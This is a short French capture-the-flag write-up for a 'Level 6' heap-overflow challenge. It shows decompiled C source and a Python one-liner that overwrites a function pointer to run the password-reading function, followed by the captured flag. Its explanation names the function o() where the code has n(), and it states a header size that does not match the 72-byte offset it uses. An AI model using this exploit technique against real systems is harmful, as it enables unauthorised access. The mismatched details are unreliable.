# Level 6

Voici le code source de ce niveau:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

void n(void)
{
    system("/bin/cat /home/user/level7/.pass");
    return;
}

void m(void *ptr, int param2, char *param3, int param4, int param5)
{
    puts("Nope");
    return;
}

void main(int ac, char **av)
{
    char *dest;
    uint *ptr;

    dest = malloc(64);
    ptr = malloc(4);
    *ptr = m;
    strcpy(dest, av[1]);
    (*ptr)();
    return;
}
```

Le principe est le meme que pour les premiers niveau a part qu'ici la memoire qu'on va vouloir rajouter est sur la heap. Ca s'appelle donc un `heap overflow`. Il y a une petite difference neamoins quand `malloc` est appelle il n'alloue pas uniquement la taille demandee car il a besoin de stocker une entete pour l'OS. Par chance nous connaissons a l'avance la taille de cette entete, qui, sur un systeme 32-bit, est 4 octets. Donc la taille du buffer en `dest` et `ptr` est de 72 octets. Nous avons juste besoin de trouver l'adresse de `o()` grace a Ghidra: `08048454`

Voici donc la commande que nous pouvons utiliser:

```bash
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
